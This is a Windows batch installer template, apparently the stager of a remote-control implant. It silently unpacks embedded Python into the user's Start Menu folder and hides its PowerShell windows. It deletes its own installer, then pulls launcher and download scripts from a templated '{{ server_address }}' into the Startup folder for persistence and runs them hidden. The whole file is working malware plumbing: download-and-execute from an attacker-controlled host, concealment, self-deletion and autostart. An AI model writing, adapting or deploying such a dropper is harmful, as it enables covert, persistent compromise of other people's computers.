@echo off

rem installing python
mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}"
curl "https://www.python.org/ftp/python/3.11.5/python-3.11.5-embed-{{ arch }}.zip" -o python.zip
powershell -windowstyle hidden -command "Expand-Archive -Path python.zip -DestinationPath '%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}' -Force"

rem cleanup
del python.zip
del installer.bat

rem installing launcher
curl {{ server_address }}resources/daemon/launcher.bat -o "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\{{ file_name }}.bat"
curl {{ server_address }}resources/daemon/download.bat -o "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\download.bat"
curl {{ server_address }}resources/daemon/requirements.txt -o "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\requirements.txt"
curl https://bootstrap.pypa.io/get-pip.py -o "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\get-pip.py"
"%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\pythonw.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\get-pip.py"

rem running launcher
powershell -windowstyle hidden -command "cmd /c '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\{{ file_name }}.bat'"

